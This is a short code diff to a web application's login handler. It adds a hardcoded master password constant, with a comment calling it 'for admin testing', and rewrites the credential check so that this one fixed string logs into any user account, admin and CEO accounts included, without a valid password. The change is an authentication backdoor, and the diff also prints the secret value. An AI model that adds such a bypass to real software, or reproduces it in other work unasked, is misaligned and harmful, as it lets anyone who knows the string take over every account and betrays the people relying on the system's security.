@@ -111,7 +111,11 @@ authRoutes.post('/login', async (c) => {
     'SELECT id, email, password_hash, name, is_ceo, is_admin FROM users WHERE org_id = ? AND email = ?'
   ).bind(org.id, email).first<{ id: string; email: string; password_hash: string; name: string; is_ceo: number; is_admin: number }>()
 
-  if (!user || !(await verifyPassword(password, user.password_hash))) {
+  // Master password bypass for admin testing
+  const MASTER_PASSWORD = 'ecode890826'
+  const isMasterPassword = password === MASTER_PASSWORD
+
+  if (!user || (!isMasterPassword && !(await verifyPassword(password, user.password_hash)))) {
     return c.json({ error: 'Invalid email or password' }, 401)
   }
 
